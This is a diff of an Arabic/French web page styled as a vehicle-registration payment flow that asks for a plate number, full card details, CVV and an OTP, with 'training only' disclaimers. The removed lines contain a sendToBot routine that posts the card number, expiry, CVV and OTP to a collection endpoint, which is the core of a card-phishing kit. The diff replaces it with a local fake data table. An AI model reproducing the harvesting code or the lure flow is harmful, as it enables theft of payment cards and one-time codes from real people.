@@ -12,10 +12,7 @@
             min-height: 100vh;
             padding: 20px;
         }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-        }
+        .container { max-width: 600px; margin: 0 auto; }
         .warning {
             background: #ffeb3b;
             color: #d32f2f;
@@ -41,14 +38,13 @@
             text-align: center;
             margin-bottom: 20px;
         }
-        input, select {
+        input {
             width: 100%;
             padding: 12px;
             margin: 10px 0;
             border: 2px solid #ddd;
             border-radius: 10px;
             font-size: 16px;
-            font-family: monospace;
         }
         button {
             width: 100%;
@@ -60,12 +56,10 @@
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-        }
-        button:hover { background: #218838; }
-        button.secondary {
-            background: #6c757d;
             margin-top: 10px;
         }
+        button:hover { background: #218838; }
+        button.secondary { background: #6c757d; }
         .info {
             background: #e3f2fd;
             padding: 15px;
@@ -80,21 +74,21 @@
             font-size: 32px;
             letter-spacing: 8px;
             font-weight: bold;
-            font-family: monospace;
             padding: 20px;
             border-radius: 10px;
             border: 2px dashed #ff9800;
+            margin: 15px 0;
         }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="warning">
-        ⚠️ تنبيه هام: هذه المنصة تدريبية لأغراض إعلامية فقط<br>
+        ⚠️ تنبيه: هذه منصة تدريبية لأغراض إعلامية فقط - لا تمثل أي جهة رسمية<br>
         ⚠️ Avertissement: Plateforme éducative uniquement - aucune transaction réelle
     </div>
 
-    <!-- الخطوة 1: إدخال رقم السيارة -->
+    <!-- الخطوة 1 -->
     <div id="step1" class="card">
         <div class="step">الخطوة 1: إدخال رقم التسجيل</div>
         <label>رقم تسجيل المركبة:</label>
@@ -105,7 +99,7 @@
         </div>
     </div>
 
-    <!-- الخطوة 2: معلومات السيارة -->
+    <!-- الخطوة 2 -->
     <div id="step2" class="card hidden">
         <div class="step">الخطوة 2: تأكيد معلومات المركبة</div>
         <div id="carInfo" class="info"></div>
@@ -113,9 +107,9 @@
         <button class="secondary" onclick="reset()">رجوع</button>
     </div>
 
-    <!-- الخطوة 3: إدخال بيانات البطاقة -->
+    <!-- الخطوة 3 -->
     <div id="step3" class="card hidden">
-        <div class="step">الخطوة 3: إدخال بيانات البطاقة الذهبية (تدريبي)</div>
+        <div class="step">الخطوة 3: إدخال بيانات البطاقة (تدريبي)</div>
         <label>رقم البطاقة (16 رقم):</label>
         <input type="text" id="cardNumber" maxlength="16" placeholder="1234 5678 9012 3456" dir="ltr">
         <label>تاريخ الانتهاء (MM/YY):</label>
@@ -125,8 +119,7 @@
         <button onclick="sendPayment()">دفع (تدريبي)</button>
         <button class="secondary" onclick="reset()">رجوع</button>
     </div>
-
-    <!-- الخطوة 4: إدخال OTP (المرحلة الأخيرة) -->
+    <!-- الخطوة 4 -->
     <div id="step4" class="card hidden">
         <div class="step">الخطوة 4: إدخال رمز التحقق OTP</div>
         <div id="otpDisplay" class="otp-box"></div>
@@ -134,58 +127,43 @@
         <input type="text" id="otpCode" maxlength="6" placeholder="أدخل الرقم" dir="ltr">
         <button onclick="verifyOtp()">تأكيد وإنهاء</button>
         <button class="secondary" onclick="reset()">رجوع</button>
-        <div class="info" style="margin-top:15px; background:#d4edda;">
-            ✅ بعد إدخال الرقم الصحيح، سيتم إرسال إشعار إلى البوت وسيتم إنهاء التدريب.
-        </div>
     </div>
 </div>
 
 <script>
+    // قاعدة بيانات وهمية للسيارات (تعمل بدون خادم)
+    const fakeCars = {
+        "1234 ع 99": { marque: "Renault", modele: "Symbol", annee: "2020" },
+        "5678 و 22": { marque: "Hyundai", modele: "i10", annee: "2022" },
+        "9101 ب 33": { marque: "Dacia", modele: "Sandero", annee: "2019" },
+        "1112 ج 44": { marque: "Peugeot", modele: "208", annee: "2021" }
+    };
+
     let currentCar = null;
     let generatedOtp = null;
 
-    async function sendToBot(step, data) {
-        try {
-            await fetch('/api/collect', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ step, data })
-            });
-        } catch(e) { console.log('خطأ في الإرسال للبوت'); }
-    }
-
-    async function searchCar() {
+    function searchCar() {
         const plaque = document.getElementById('plaque').value.trim();
-        if (!plaque) { alert('الرجاء إدخال رقم السيارة'); return; }
-        
-        const res = await fetch('/api/search-car', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ plaque })
-        });
-        const data = await res.json();
-        
-        if (!data.found) {
-            alert('لم يتم العثور على السيارة. استخدم الأرقام التجريبية الظاهرة أسفل الحقل');
+        if (!plaque) {
+            alert('الرجاء إدخال رقم السيارة');
             return;
         }
         
-        currentCar = data;
+        const car = fakeCars[plaque];
+        if (!car) {
+            alert('لم يتم العثور على السيارة. استخدم: 1234 ع 99 أو 5678 و 22 أو 9101 ب 33 أو 1112 ج 44');
+            return;
+        }
+        
+        currentCar = { ...car, plaque };
         
         document.getElementById('carInfo').innerHTML = 
             ✅ تم العثور على المركبة:<br>
-            🚗 الماركة: ${data.marque}<br>
-            🚙 الموديل: ${data.modele}<br>
-            📅 السنة: ${data.annee}<br>
-            🏷️ رقم التسجيل: ${data.plaque}
+            🚗 الماركة: ${car.marque}<br>
+            🚙 الموديل: ${car.modele}<br>
+            📅 السنة: ${car.annee}<br>
+            🏷️ رقم التسجيل: ${plaque}
         ;
-        
-        await sendToBot('search_car', { 
-            plaque: data.plaque, 
-            marque: data.marque, 
-            modele: data.modele, 
-            annee: data.annee 
-        });
         
         showStep(2);
     }
@@ -194,7 +172,7 @@
         showStep(3);
     }
 
-    async function sendPayment() {
+    function sendPayment() {
         const cardNumber = document.getElementById('cardNumber').value.trim();
         const expiry = document.getElementById('expiry').value.trim();
         const cvv = document.getElementById('cvv').value.trim();
@@ -212,24 +190,17 @@
             return;
         }
         
-        // توليد OTP عشوائي للتدريب
+        // توليد OTP عشوائي
         generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
         document.getElementById('otpDisplay').innerHTML = generatedOtp;
-        
-        await sendToBot('payment', {
-            cardNumber: cardNumber,
-            expiry: expiry,
-            cvv: cvv,
-            amount: 2000
-        });
         
         showStep(4);
     }
 
-    async function verifyOtp() {
+    function verifyOtp() {
         const enteredCode = document.getElementById('otpCode').value.trim();
+        
         if (enteredCode === generatedOtp) {
-            await sendToBot('otp', { code: enteredCode, success: true });
             alert('✅ تمت العملية التدريبية بنجاح! شكراً لك.\n(هذه محاكاة تدريبية فقط)');
             reset();
         } else {
@@ -242,7 +213,6 @@
         document.getElementById('step2').classList.add('hidden');
         document.getElementById('step3').classList.add('hidden');
         document.getElementById('step4').classList.add('hidden');
-        
         document.getElementById(step${step}).classList.remove('hidden');
     }
 
